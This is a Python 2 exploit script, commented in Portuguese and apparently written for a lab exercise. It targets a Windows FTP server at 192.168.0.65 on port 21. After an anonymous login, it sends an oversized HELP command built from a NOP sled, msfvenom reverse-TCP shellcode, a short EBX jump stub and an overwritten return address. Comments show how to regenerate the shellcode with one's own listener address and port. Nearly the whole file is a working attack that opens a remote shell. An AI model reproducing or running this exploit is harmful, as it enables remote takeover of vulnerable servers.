#!/usr/bin/python

import socket,time

#Cria as intrucoes para o programa ir para o espaco onde estara nosso exploit
#No caso o jmp tem as instrucoes 83eb32 que corresponde ha SUB EBX,32 que significa voltar 50 bytes e FFE3 que significa JMP EBX
jmp = '\x83\xEB\x32' * 8
jmp += '\xFF\xE3'

#Shell code (alterar para o gerado no seu laboratorio)
# comando usado para geral:
#msfvenom -p windows/shell_reverse_tcp LHOST='IP' LPORT='porta' -b '\x00\x0a\x0d\x20\x40' EXITFUNC=thread -f python
buf =  ""
buf += "\xb8\xe9\x9b\x0e\xf3\xdb\xd9\xd9\x74\x24\xf4\x5b\x2b"
buf += "\xc9\xb1\x52\x31\x43\x12\x83\xc3\x04\x03\xaa\x95\xec"
buf += "\x06\xd0\x42\x72\xe8\x28\x93\x13\x60\xcd\xa2\x13\x16"
buf += "\x86\x95\xa3\x5c\xca\x19\x4f\x30\xfe\xaa\x3d\x9d\xf1"
buf += "\x1b\x8b\xfb\x3c\x9b\xa0\x38\x5f\x1f\xbb\x6c\xbf\x1e"
buf += "\x74\x61\xbe\x67\x69\x88\x92\x30\xe5\x3f\x02\x34\xb3"
buf += "\x83\xa9\x06\x55\x84\x4e\xde\x54\xa5\xc1\x54\x0f\x65"
buf += "\xe0\xb9\x3b\x2c\xfa\xde\x06\xe6\x71\x14\xfc\xf9\x53"
buf += "\x64\xfd\x56\x9a\x48\x0c\xa6\xdb\x6f\xef\xdd\x15\x8c"
buf += "\x92\xe5\xe2\xee\x48\x63\xf0\x49\x1a\xd3\xdc\x68\xcf"
buf += "\x82\x97\x67\xa4\xc1\xff\x6b\x3b\x05\x74\x97\xb0\xa8"
buf += "\x5a\x11\x82\x8e\x7e\x79\x50\xae\x27\x27\x37\xcf\x37"
buf += "\x88\xe8\x75\x3c\x25\xfc\x07\x1f\x22\x31\x2a\x9f\xb2"
buf += "\x5d\x3d\xec\x80\xc2\x95\x7a\xa9\x8b\x33\x7d\xce\xa1"
buf += "\x84\x11\x31\x4a\xf5\x38\xf6\x1e\xa5\x52\xdf\x1e\x2e"
buf += "\xa2\xe0\xca\xe1\xf2\x4e\xa5\x41\xa2\x2e\x15\x2a\xa8"
buf += "\xa0\x4a\x4a\xd3\x6a\xe3\xe1\x2e\xfd\xcc\x5e\x30\xc0"
buf += "\xa4\x9c\x30\x3b\x8e\x28\xd6\x51\xe0\x7c\x41\xce\x99"
buf += "\x24\x19\x6f\x65\xf3\x64\xaf\xed\xf0\x99\x7e\x06\x7c"
buf += "\x89\x17\xe6\xcb\xf3\xbe\xf9\xe1\x9b\x5d\x6b\x6e\x5b"
buf += "\x2b\x90\x39\x0c\x7c\x66\x30\xd8\x90\xd1\xea\xfe\x68"
buf += "\x87\xd5\xba\xb6\x74\xdb\x43\x3a\xc0\xff\x53\x82\xc9"
buf += "\xbb\x07\x5a\x9c\x15\xf1\x1c\x76\xd4\xab\xf6\x25\xbe"
buf += "\x3b\x8e\x05\x01\x3d\x8f\x43\xf7\xa1\x3e\x3a\x4e\xde"
buf += "\x8f\xaa\x46\xa7\xed\x4a\xa8\x72\xb6\x6b\x4b\x56\xc3"
buf += "\x03\xd2\x33\x6e\x4e\xe5\xee\xad\x77\x66\x1a\x4e\x8c"
buf += "\x76\x6f\x4b\xc8\x30\x9c\x21\x41\xd5\xa2\x96\x62\xfc"

buffer = '\x90' * (1024 - len(buf)) + buf + 'B' * (40 - len(jmp)) + jmp + '\xC8\x11\x9E\x7C'

#cria socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#conecta no socket na porta 21
s.connect(('192.168.0.65',21))

#pega a resposta
r = s.recv(4096)

print r

time.sleep(2)
#Envia um usuario de teste
s.send('USER anonymous\r\n')
r = s.recv(1024)
print r

time.sleep(2)
#Envia uma senha
s.send('PASS anonymous\r\n')
r = s.recv(4096)
print r

#Foi necessario ajustar o time out e diminuir para ajustar e o exploit dar certo
#No exemplo do longato ele coloca so um time out
#time.sleep(20)
time.sleep(5)
s.send('HELP'+buffer+'\r\n')
r = s.recv(8192)
print r

time.sleep(2)
#Fecha a conexao
s.close()
